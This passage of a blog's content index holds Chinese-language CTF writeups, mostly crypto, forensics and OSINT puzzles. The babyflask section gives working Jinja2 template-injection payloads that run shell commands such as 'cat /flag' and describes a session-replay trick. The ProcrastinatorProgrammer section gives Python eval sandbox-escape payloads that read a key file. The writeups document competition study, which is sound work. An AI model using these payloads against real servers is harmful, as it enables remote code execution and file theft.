index=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> number=<span class="number">1</span>;</span><br><span class="line">    vector&lt;pair&lt;string,<span class="type">int</span>&gt;&gt;::iterator t=mm.<span class="built_in">begin</span>();</span><br><span class="line">    ll flag=(*t).second;</span><br><span class="line">    <span class="keyword">for</span>(t=mm.<span class="built_in">begin</span>();t!=mm.<span class="built_in">end</span>();t++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag!=(*t).second)</span><br><span class="line">        &#123;</span><br><span class="line">            flag=(*t).second;</span><br><span class="line">            index=number;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index&gt;k)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        cout&lt;&lt;index&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(*t).first&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(*t).second&lt;&lt;endl;</span><br><span class="line">        number++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比赛的时候没看清题意，上来就直接一个map，快写完了的时候才发现不对，然后就突发奇想的对map进行sort，但是编译的时候比较函数那一行一直报错。我到现在都不清楚为什么比赛的时候要一直死磕对map按照value进行sort，就是懒得改成结构体加vector，结果直到比赛结束前几分钟才开始改，虽然改完了可惜没时间交了。<br>回到宿舍终于在网上找到了对map进行sort的方法：将map转存至vector中，然后sort。<code>vector&lt;pair&lt;string,int&gt;&gt; mm(m.begin(),m.end());</code>但是还是用结构体加vector方便啊。<br>还是自己菜啊.......</p>
<div class="note warning"><p>
注意：STL库中的sort函数只能对线性存储的对象进行排序,如:vector、array、list、deque,不能对集合容器进行排序,如:set、map;
</p></div>

<p>参考博客:<a href="https://blog.csdn.net/iicy266/article/details/11906189">C++ STL中Map的按Key排序和按Value排序</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>ACM</tag>
        <tag>CCCC天梯赛</tag>
      </tags>
  </entry>
  <entry>
    <title>L3HCTF2021-个人能力认证 Writeup</title>
    <url>/posts/98571386/</url>
    <content><![CDATA[<h1 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h1><p><em><a href="http://123.60.19.253:10001/">http://123.60.19.253:10001</a></em></p>
<hr>
<p>分析给出的源文件,发现<code>/success</code>路由下的<code>name</code>存在SSTI漏洞.</p>
<p>继续分析,<code>name</code>取自<code>session[&#39;name&#39;]</code>,用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可.</p>
<pre><code class="python">template =  &#39;&#39;&#39;
Congratulations, %s. You can get flag now!
&#39;&#39;&#39; % name
return render_template_string(template)
</code></pre>
<p>要想执行到上述代码,需要给flag投满8票(我们手里只有5票),注意到vote是存储在session中,<code>/vote</code>接口会校验<code>session</code>中保存的vote数量并减一,猜测这里可能存在session会话劫持.</p>
<p>我们第一次登录时复制一下当前的<code>session</code>,然后给flag投票,等手里的票用光之后,再把第一次登录时复制的<code>seesion</code>粘贴进浏览器保存的Cookie中,我们的票又回来了.</p>
<blockquote>
<p>🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一.</p>
</blockquote>
<img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/0.jpg" alt="image-20211114190032492" style="zoom:50%;" />

<p>使用如下代码作为用户名登录,查看一下当前已加载模块</p>
<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()&#125;&#125;
</code></pre>
<img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/1.jpg" alt="image-20211114182131940" style="zoom:50%;" />

<p>人肉计数&#x2F;写个脚本,找到<code>os._wrap_close</code>模块所在的索引,借助于<code>popen</code>函数可以直接执行系统命令</p>
<pre><code class="python">num = 0
for i in a.split(&#39;, &#39;):
    if &#39;os._wrap_close&#39; in i:
        print(num)
    num += 1
</code></pre>
<p>先<code>ls -a</code>一下,发现<code>config.py</code></p>
<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()&#125;&#125;
</code></pre>
<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/2.png" alt="image-20211114183143814"><br>继续<code>cat</code>,没有在<code>config.py</code>中找到flag</p>
<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()&#125;&#125;
</code></pre>
<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/3.png" alt="image-20211114183703433"></p>
<p>用<code>ls -R /</code>找找,发现存在<code>/flag</code>文件</p>
<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()&#125;&#125;
</code></pre>
<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/4.jpg" alt="image-20211114183857713"><br>直接<code>cat /flag</code>即可</p>
<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;
</code></pre>
<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/5.png" alt="image-20211114184236370"></p>
<p><strong>flag:</strong><code>l3hsec&#123;emmMmMM_mm~mMMmm~~T&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>L3HCTF</tag>
        <tag>个人能力认证</tag>
      </tags>
  </entry>
  <entry>
    <title>SunshineCTF2021 Writeup</title>
    <url>/posts/1683940375/</url>
    <content><![CDATA[<h1 id="MultipleExponents"><a href="#MultipleExponents" class="headerlink" title="MultipleExponents"></a>MultipleExponents</h1><p><em>Both Alice and Bob share the same modulus, but with different exponents. If only there was some way I could recover this message that was sent to both of them.</em></p>
<hr>
<p>题目中给出了n,e1,e2,c1,c2的值,这里可以利用<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/#_7">RSA共模攻击</a></p>
<pre><code class="python">import gmpy2
from Crypto.Util.number import long_to_bytes

data = &#123;&#39;n&#39;: 86683300105327745365439507825347702001838360528840593828044782382505346188827666308497121206572195142485091411381691608302239467720308057846966586611038898446400292056901615985225826651071775239736355509302701234225559345175968513640372874437860580877571155199027883755959442408968543666251138423852242301639, &#39;e1&#39;: 11048796690938982746152432997911442334648615616780223415034610235310401058533076125720945559697433984697892923155680783661955179131565701195219010273246901, &#39;e2&#39;: 9324711814017970310132549903114153787960184299541815910528651555672096706340659762220635996774790303001176856753572297256560097670723015243180488972016453,
        &#39;c1&#39;: 84855521319828020020448068809384113135703375013574055636013459151984904926013060168559438932572351720988574536405041219757650609586761217385808427001020204262032305874206933548737826840501447182203920238204769775531537454607204301478815830436609423437869412027820433923450056939361510843151320837485348066171, &#39;c2&#39;: 54197787252581595971205193568331257218605603041941882795362450109513512664722304194032130716452909927265994263753090021761991044436678485565631063700887091405932490789561882081600940995910094939803525325448032287989826156888870845730794445212288211194966299181587885508098448750830074946100105532032186340554&#125;
n = data[&#39;n&#39;]
e1 = data[&#39;e1&#39;]
e2 = data[&#39;e2&#39;]
message1 = data[&#39;c1&#39;]
message2 = data[&#39;c2&#39;]

# s &amp; t
gcd, s, t = gmpy2.gcdext(e1, e2)
if s &lt; 0:
    s = -s
    message1 = gmpy2.invert(message1, n)
if t &lt; 0:
    t = -t
    message2 = gmpy2.invert(message2, n)
plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n
print(plain)
print(long_to_bytes(plain).decode(&#39;utf-8&#39;))
</code></pre>
<p><strong>flag:</strong><code>sun&#123;d0n7_d0_m0r3_th4n_0ne_3xp0n3nt&#125;</code></p>
<h1 id="DownUnder"><a href="#DownUnder" class="headerlink" title="DownUnder"></a>DownUnder</h1><p><em>I mentioned to a friend of mine from Australia that I like the Game Boy Advance. Apparantly, they had a mysterious cartridge they found at a Men At Work concert, and they figured to send it me to figure out what&#39;s on it.</em></p>
<p><em>However, I have no clue why it keeps referencing a &quot;flag.&quot; I ripped it already, but I can&#39;t figure out what it&#39;s about. Can you help me crack this code?</em></p>
<hr>
<p>题目中给出了一个<code>Gameboy</code>文件,放在<a href="https://github.com/visualboyadvance-m/visualboyadvance-m">VisualBoxAdvance</a>里运行:</p>
<img data-src="../../CTF/SunshineCTF2021/Misc/assets/DownUnder.png" alt="visual-box" style="zoom:50%;" />

<p>点击<code>Tools</code>-&gt;<code>Map Viewer</code>,勾选<code>Stretch to fit</code>,即可以在<code>Map</code>的底部看到flag</p>
<img data-src="../../CTF/SunshineCTF2021/Misc/assets/DownUnder-Map.png" alt="DownUnder-Map" style="zoom:60%;" />

<p><strong>flag:</strong><code>sun&#123;n1ce_str1ngs_c0mm4nd_but_ch3cc_th3_m@p&#125;</code></p>
<h1 id="ProcrastinatorProgrammer"><a href="#ProcrastinatorProgrammer" class="headerlink" title="ProcrastinatorProgrammer"></a>ProcrastinatorProgrammer</h1><p><em>I may have procrastinated security for <code>procrastinate.chal.2021.sunshinectf.org:65000</code>. I may have been watching too many Tom Cruise movies instead of releasing this... uh... last year.</em></p>
<p><em>But don&#39;t worry! The keys to the kingdom are split into three parts... you&#39;ll never find them all!</em></p>
<p><em>Flag will be given by our backend in the standard <code>sun&#123;&#125;</code> format, but make sure you put all the pieces together!</em></p>
<hr>
<ol>
<li>Part One</li>
</ol>
<pre><code>Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do some processing!I&#39;m super secure, and can use all python! I just use `eval()` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key!

Give me an equation please!
</code></pre>
<p><code>eval()</code>,使用<code>open(&#39;key&#39;,&#39;r&#39;).readlines()</code>得到flag的第一部分<code>sun&#123;eval_is</code></p>
<ol start="2">
<li>Part Two</li>
</ol>
<pre><code>Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the last challenge, I&#39;ve upped my ante! Now I know it&#39;s secure!I&#39;m super secure, and can use most python math! I just use `eval(client_input, \&#123;\&#125;, safe_math_functions)` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key!
   
Halt in the name of the law!
   
What was the ./key found in the previous challenge?
</code></pre>
<p><code>eval(client_input, &#123;&#125;, safe_math_functions)</code>,使用<code>__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read()</code>得到flag的第二部分<code>_safe_</code></p>
<ol start="3">
<li>Part Three</li>
</ol>
<pre><code>Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the previous set, I had to remove math lib support! In fact the only thing this can do is add and subtract now!... I think. Google tells me that it&#39;s secure now! Well the second result anyhow.I&#39;m super secure, and can use a bit of python math! I just use `eval(client_input, &#123;&#39;__builtins__&#39;:\&#123;\&#125;&#125;)` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key!
   
Halt in the name of the law!
   
What was the ./key found in the previous challenge?
</code></pre>
<p><code>eval(client_input, &#123;&#39;__builtins__&#39;:&#123;&#125;&#125;)</code>,使用</p>
<pre><code class="python">[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ ==&quot;catch_warnings&quot;][0]()._module.__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read()
</code></pre>
<p>得到flag的第三部分<code>only_if_you_ast_whitelist_first&#125;</code></p>
<p><strong>flag:</strong><code>sun&#123;eval_is_safe_only_if_you_ast_whitelist_first&#125;</code></p>
<p>参考文章:</p>
<ul>
<li><a href="http://lybniz2.sourceforge.net/safeeval.html">safe eval</a></li>
<li><a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/">python 沙箱逃逸与SSTI</a></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SunshineCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>TFCCTF2021 Writeup</title>
    <url>/posts/501486646/</url>
    <content><![CDATA[<h1 id="SEA-LANGUAGE-1"><a href="#SEA-LANGUAGE-1" class="headerlink" title="SEA LANGUAGE 1"></a>SEA LANGUAGE 1</h1><p><em>Quick! Help! We are sinking!</em></p>
<p><em>Wrap the result in TFCCTF{}</em></p>
<hr>
<p>看着像摩斯码,直接在<a href="https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')&input=Li0tIC4uLi4gLi4uLi0gLSAtLi4uLi0gLi0gLi0uIC4uLi0tIC0uLi4uLSAtLi0tIC0tLS0tIC4uLSAtLi4uLi0gLi4uIC4tLS0tIC0uIC0uLSAuLS0tLSAtLiAtLS4gLS4uLi4tIC4tIC0uLi4gLS0tLS0gLi4tIC0gLi4tLS4uIC0uLS4tLSAtLi0uLS0gLS4tLi0tIC4uLS0uLgo">gchq.github.io</a>上解密</p>
<p><img data-src="/../../CTF/TFCCTF2021/Crypto/images/image-20211202204916391.png" alt="image-20211202204916391"></p>
<p><strong>flag:</strong><code>TFCCTF&#123;WH4T-AR3-Y0U-S1NK1NG-AB0UT?!!!?&#125;</code></p>
<h1 id="SEA-LANGUAGE-2"><a href="#SEA-LANGUAGE-2" class="headerlink" title="SEA LANGUAGE? 2"></a>SEA LANGUAGE? 2</h1><p><em>That&#39;s just another way to......</em></p>
<hr>
<p>题目给的数据8个字符为一组,猜测可能是二进制,在<a href="https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'.'%7D,'0',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'_'%7D,'1',true,false,true,false)From_Binary('Space',8)&input=Ll8uXy5fLi4gLl8uLi5fXy4gLl8uLi4uX18gLl8uLi4uX18gLl8uXy5fLi4gLl8uLi5fXy4gLl9fX18uX18gLl9fXy5fX18gLi5fXy5fLi4KIC4uX18uLi5fIC4uX18uX19fIC5fLl9fX19fIC4uX18uXy4uIC5fLl9fX19fIC5fXy5fXy5fIC4uX18uLi5fIC5fXy5fX18uIC5fX18uXy5fCiAuLl9fLl9fXyAuLl9fLi5fXyAuLl8uX19fLiAuLl8uX19fLiAuLl8uX19fLiAuXy5fX19fXyAuLl9fLl9fXyAuX18uXy4uLiAuLl9fLi4uXwogLi5fXy5fLl8gLl8uX19fX18gLi5fXy4uLl8gLl9fXy4uX18gLl8uX19fX18gLl9fLl9fXy4gLi5fXy4uLi4gLi5fXy5fX18gLl8uX19fX18KIC5fXy5fXy5fIC4uX18uLi4uIC5fX18uLl8uIC5fX18uLl9fIC4uX18uLl9fIC4uXy4uLi5fIC4uXy4uLi5fIC4uXy4uLi5fIC4uXy4uLi5fCiAuLl8uLi4uXyAuX19fLi5fLiAuLl9fLi4uXyAuX18uLl9fXyAuX18uXy4uLiAuLl9fLl9fXyAuLl9fX19fXyAuX19fX18uXwo">gchq.github.io</a>将<code>.</code>替换为<code>0</code>,<code>_</code>替换为<code>1</code>,然后二进制转字符串</p>
<p><img data-src="/../../CTF/TFCCTF2021/Crypto/images/image-20211202205304755.png" alt="image-20211202205739848"></p>
<p><strong>flag:</strong><code>TFCCTF&#123;w417_4_m1nu73..._7h15_1s_n07_m0rs3!!!!!r1gh7?&#125;</code></p>
<h1 id="AAAAA"><a href="#AAAAA" class="headerlink" title="AAAAA"></a>AAAAA</h1><p><em>AAAAA. That&#39;s all</em></p>
<hr>
<p>首先用<code>exiftool</code>分析,提示文件前2000个字节都是A</p>
<pre><code class="shell">~$ exiftool AAAAA
ExifTool Version Number         : 12.31
File Name                       : AAAAA
Directory                       : .
File Size                       : 157 KiB
File Modification Date/Time     : 2021:11:27 00:33:54+08:00
File Access Date/Time           : 2021:11:27 00:35:25+08:00
File Inode Change Date/Time     : 2021:11:27 00:34:19+08:00
File Permissions                : -rw-r--r--
Error                           : First 2000 bytes of file is ASCII &#39;A&#39; characters
</code></pre>
<p><code>hexdump -C AAAAA   </code>发现文件末尾的字节也有很多A,并且文件应该是一张PNG格式的图片</p>
<pre><code class="shell">~$ hexdump -C AAAAA | head
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
*
000007d0  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
000007e0  00 00 07 62 00 00 05 89  08 02 00 00 00 23 47 40  |...b.........#G@|
000007f0  3c 00 00 00 09 70 48 59  73 00 00 2e 23 00 00 2e  |&lt;....pHYs...#...|
00000800  23 01 78 a5 3f 76 00 02  65 2b 49 44 41 54 78 9c  |#.x.?v..e+IDATx.|
00000810  ec bd 67 7b 1a cb da b4  dd 83 10 39 83 50 b6 bd  |..g&#123;.......9.P..|
00000820  c2 de ff ff df dc ef 5e  6b d9 96 ad 48 ce 39 cc  |.......^k...H.9.|
00000830  fb a1 9e a9 e3 12 b2 bd  1c 24 10 50 e7 07 1d 08  |.........$.P....|
00000840  21 18 26 f4 74 57 57 d7  e5 f9 be ef 84 10 42 08  |!.&amp;.tWW.......B.|

~$ hexdump -C AAAAA | tail  
00026cf0  00 00 88 26 13 03 00 00  00 00 44 93 89 01 00 00  |...&amp;......D.....|
00026d00  00 00 a2 c9 c4 00 00 00  00 00 d1 64 62 00 00 00  |...........db...|
00026d10  00 80 68 32 31 00 00 00  00 40 34 99 18 00 00 00  |..h21....@4.....|
00026d20  00 20 9a 4c 0c 00 00 00  00 10 4d 26 06 00 00 00  |. .L......M&amp;....|
00026d30  00 88 f6 7f 00 7a e5 96  20 a3 a9 bd a4 00 00 00  |.....z.. .......|
00026d40  00 49 45 4e 44 ae 42 60  82 41 41 41 41 41 41 41  |.IEND.B`.AAAAAAA|
00026d50  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
*
00027510  41 41 41 41 41 41 41 41  41                       |AAAAAAAAA|
00027519
</code></pre>
<p>去除文件首位的<code>A</code>即可,代码:</p>
<pre><code class="python">from pathlib import  Path
p = Path(&#39;AAAAA&#39;)
data = p.read_bytes()
data = data.strip(b&#39;A&#39;)
Path(&#39;a.png&#39;).write_bytes(data)
</code></pre>
<p><img data-src="/../../CTF/TFCCTF2021/Forensics/images/AAAAA.png" alt="AAAAA.png"></p>
<p><strong>flag:</strong><code>TFCCTF&#123;Gr4phic_d35ign_is_my_p455ion&#125;</code></p>
<h1 id="DISCORD-SHENANIGANS"><a href="#DISCORD-SHENANIGANS" class="headerlink" title="DISCORD SHENANIGANS"></a>DISCORD SHENANIGANS</h1><p><em>We considered giving you a free flag. However, we decided against it. In general, we would never do that! Or would we? That&#39;s the beginning of a good CTF! Discord is the new Twitter.</em></p>
<p><em>To be able to solve this challenge, you&#39;ll need to join our discord. Link in the Rules page.</em></p>
<hr>
<p>翻阅比赛官方的Discord,发现<code>#general</code>频道有一条特别奇怪的消息</p>
<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211203203451799.png" alt="image-20211203203451799"></p>
<p>使用<a href="https://holloway.nz/steg/">Twitter Secret Messages</a>解密即可</p>
<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211202215347694.png" alt="image-20211202215347694"></p>
<p><strong>flag:</strong><code>TFCCTF&#123;th1s_5t3g0_fl4g_w45_n0t_h1dden_w3ll&#125;</code></p>
<h1 id="PRETTY-GOOD-PHISHER"><a href="#PRETTY-GOOD-PHISHER" class="headerlink" title="PRETTY GOOD PHISHER"></a>PRETTY GOOD PHISHER</h1><p><em>This phisher thinks he&#39;s the game! We got his PGP Key ID from his phishing e-mail, and we know for sure that he has another PGP key publicized under his real name! Can you find out more about him?</em></p>
<p><em>A2DCB36111E3656B</em></p>
<hr>
<p>题目给了一个人的PGP密钥ID,要求我们找到他另一个以真名公开的PGP密钥</p>
<p>在<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event?SearchCriteria=A2DCB36111E3656B&EmailOrName=3&SearchType=0">https://keyserver.pgp.com/</a>上检索,得到邮箱<code>tdgd11fd8@gmail.com</code></p>
<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211203195242066.png" alt="image-20211203195242066"></p>
<p>在<a href="https://tools.epieos.com/email.php">OSINT Tool</a>上搜索该邮箱,得到用户名是<code>Theobald Dannie Gyles</code></p>
<img data-src="../../CTF/TFCCTF2021/Misc/images/image-20211203200112827.png" alt="image-20211203200112827" style="zoom:50%;" />

<p>在<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event">https://keyserver.pgp.com/</a>上搜索包含该用户名的PGP密钥,即可得到flag</p>
<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211203201556442.png" alt="image-20211203201556442"></p>
<p><strong>flag:</strong><code>TFCCTF&#123;Pee,G...Pee!_w4s_wh4t_th4t_h3_t0ld_m3....!&#125;) </code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>TFCCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>TMUCTF2021 Writeup</title>
    <url>/posts/500717398/</url>
    <content><![CDATA[<h1 id="Puzzle"><a href="#Puzzle" class="headerlink" title="Puzzle"></a>Puzzle</h1><p><em>Life is a puzzle!</em></p>
<hr>
<p>给了一张图片,首先使用<code>binwalk</code>提取一下文件,得到一个有密码的压缩文件和一张图片.</p>
<img data-src="../../CTF/TMUCTF2021/Misc/assets/puzzle.png" style="zoom:40%;" />

<p>观察图片发现,第一位数字表示行号,剩下的数字是在描述上一行数字的个数.</p>
<p>例如,从12-&gt;11112是:先写一个1表示行号,上一行有1个1、1个2,加上11和12即可得到11112.</p>
<p>依次类推,得到压缩包的解压密码<code>?</code>是<code>61542142311</code>.</p>
<p>输入密码,解压得到<code>flag.txt</code>:</p>
<p><code>R1pIUEdTe1EzeV9NM19RNDU3NHpfRTRzNzBfVzRhX1U0el9PMV9RM3kwX1c0YV9QdTAwYV9YMGE0en0=</code></p>
<p>base64解码一下:</p>
<p><code>GZHPGS&#123;Q3y_M3_Q4574z_E4s70_W4a_U4z_O1_Q3y0_W4a_Pu00a_X0a4z&#125;</code></p>
<p>ROT13解密一下:</p>
<p><code>TMUCTF&#123;D3l_Z3_D4574m_R4f70_J4n_H4m_B1_D3l0_J4n_Ch00n_K0n4m&#125;</code></p>
<p><strong>flag:</strong><code>TMUCTF&#123;D3l_Z3_D4574m_R4f70_J4n_H4m_B1_D3l0_J4n_Ch00n_K0n4m&#125;</code></p>
<h1 id="Too-Much"><a href="#Too-Much" class="headerlink" title="Too Much"></a>Too Much</h1><p><em>I found a program that generates the flag of this challenge, but the implementation of one of its functions is not available. This function seems simple, but I am confused because of the large number of numbers! Can you help me find the flag before the competition is over?!</em></p>
<hr>
<p>题目给了一个包含1000000个数字的文件<code>numbers.txt</code>,要求编写一个函数:对于给定的x,在<code>numbers.txt</code>中找到两个数y和z,要求满足y !&#x3D; z 和 (y + z) &#x3D;&#x3D; x,返回不重复的(y,z)的个数.</p>
<p>利用哈希数组的思想,将时间复杂度降到O(n):</p>
<pre><code class="python">def func2(x):
    &quot;&quot;&quot;
    Returns the number of distinct pairs (y, z) from the numbers in the file &quot;numbers.txt&quot; whose y != z and (y + z) == x
    Note that two pairs (y, z) and (z, y) are considered the same and are counted only once
    &quot;&quot;&quot;
    with open(&#39;numbers.txt&#39;, &#39;r&#39;) as f:
        data = [int(_) for _ in f.readlines()]

    length = max(data) + 1
    hash_arr = [False] * (length)

    for t in data:
        hash_arr[t] = True
    ans = 0
    for y in data:
        z = x-y
        if z &gt; 0 and hash_arr[z]:
            if y != z:
                ans += 1
    print(chr(ans//2))
    return ans // 2

def get_flag(res):
    flag = []
    for i in range(len(res)):
        flag.append(chr(func2(res[i])))
    flag = &#39;&#39;.join(flag)
    return flag

if __name__ == &quot;__main__&quot;:
    res = [751741232, 519127658, 583555720, 3491231752, 3333111256, 481365731, 982100628, 1001121327, 3520999746,
           915725624, 3218509573, 3621224627, 3270950626, 3321456817, 3091205444, 999888800, 475855017, 448213157,
           3222412857, 820711846, 3710211491, 3119823672, 3333211607, 812955676, 971211391, 3210953872, 289789909,
           781213400, 578265122, 910021887, 653886578, 3712776506, 229812345, 582319118, 1111276998, 1151016390,
           700123328, 1074521304, 3210438183, 817210125, 501231350, 753244584, 3240911853, 415234677, 469125436,
           592610671, 612980665, 291821367, 344199617, 1011100412, 681623864, 897219249, 3132267885, 565913000,
           301203203, 3100544737, 432812663, 1012813485, 510928797, 671553831, 3216409218, 3191288433, 698777123,
           3512778698, 810476845, 3102989588, 3621432709, 812321695, 526486561, 378912454, 3316207359, 623111580,
           344209171, 537454826, 691277475, 2634678623, 1112182335, 792111856, 762989676, 666210267, 871278369,
           581009345, 391231132, 921732469, 717217468, 3101412929, 3101217354, 831912337, 532666530, 701012510,
           601365919, 492699680, 2843119525]
    print(&quot;The flag is&quot;, get_flag(res))
</code></pre>
<pre><code>The flag is TMUCTF&#123;r4nd0m_fl46_f0r_fun!_SzC!$JvnbrRh6kc*1@L!4vMueH1k0xKPJem@vh6Y2&amp;Sb2CJzwjnTfU6wVZyePOK3&#125;
</code></pre>
<p><strong>flag:</strong><code>TMUCTF&#123;r4nd0m_fl46_f0r_fun!_SzC!$JvnbrRh6kc*1@L!4vMueH1k0xKPJem@vh6Y2&amp;Sb2CJzwjnTfU6wVZyePOK3&#125;</code></p>
<h1 id="The-Foreign-Student"><a href="#The-Foreign-Student" class="headerlink" title="The Foreign Student"></a>The Foreign Student</h1><p><em>Tarbiat Modares University has a foreign student. His name is Zedmondo. He has a</em> very shady character. He always walks alone, eats alone, and never talks much.There are some rumors about him. Some people say he is a genius sociopath; some say he is just too self-involved. But one thing is obvious; he has a secret.Once, one of the students heard that he was talking about receiving some important documents via a private email. Maybe if we find his email, we can learn about his secret.*</p>
<hr>
<p>题目是要我们找一个叫<code>Zedmondo</code>的大学生的<code>private email</code></p>
<p>首先,用Google搜索<code>Zedmondo Tarbiat Modares University</code>,找到这个人的<a href="https://ir.linkedin.com/in/zedmondo-zaberini-203b33206">Linkedin主页</a></p>
<img data-src="../../CTF/TMUCTF2021/Osint/assets/linkedin.png" alt="Zedmondo 领英" style="zoom:80%;" />

<p>除了一个Github链接外(<a href="https://github.com/ZedZini">https://github.com/ZedZini</a>),没有什么其他有价值的信息</p>
<p>浏览Github上的仓库,结合题目中的<code>he has a secret.</code>,一个仓库<a href="https://github.com/ZedZini/secretkey">https://github.com/ZedZini/secretkey</a>的<code>README</code>引起了我的注意.</p>
<pre><code># secretkey
It is a public key. Not really a secret, right?!
</code></pre>
<p>与<code>README</code>一起的还有一个<a href="https://github.com/ZedZini/secretkey/blob/main/0xEB0B6528-pub.asc">PGP公钥文件</a>:</p>
<pre><code>-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: Keybase OpenPGP v1.0.0
Comment: https://keybase.io/crypto

xsFNBGAqSQ8BEADZtFG6grS2QP9afsA7SmT85TpxcSmG5LGLmSHKgI47ZwS+dPrO
SzChR0Jt3vI7BjA3WVlxQp94XTqRqFrjtJkS2I3nO3I94jhLu0AwfoiskKzyl+tQ
...
-----END PGP PUBLIC KEY BLOCK-----
</code></pre>
<p>访问<a href="https://keybase.io/crypto">https://keybase.io/crypto</a>,发现网站上已经给出了使用说明:</p>
<pre><code class="shell">Using the Keybase command line app
keybase pgp encrypt -m &quot;message&quot; [them]
With GPG or another PGP program
You may import from Keybase to GPG easily and then perform whatever cryptographic actions you want.

# using curl
curl https://keybase.io/[them]/key.asc | gpg --import

# using `keybase pgp pull` which
# imports to GPG key chain for you
keybase follow [them]
keybase pgp pull [them]
</code></pre>
<p>参照使用说明:</p>
<pre><code class="shell">curl https://raw.githubusercontent.com/ZedZini/secretkey/main/0xEB0B6528-pub.asc | gpg --import

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  
gpg: 目录‘/Users/zhaoqi219/.gnupg’已创建
gpg: 钥匙箱‘/Users/zhaoqi219/.gnupg/pubring.kbx’已创建
100  6139  100  6139    0     0   4494      0  0:00:01  0:00:01 --:--:--  4490
gpg: /Users/zhaoqi219/.gnupg/trustdb.gpg：建立了信任度数据库
gpg: 密钥 586DD615EB0B6528：公钥 “Zedmondo Zaberini (Nothing to say...) &lt;Z3dm0nd0_Z4b3r1n5k1_15_My_R34l_N4m3@zaberini.com&gt;” 已导入
gpg: 处理的总数：1
gpg:               已导入：1
</code></pre>
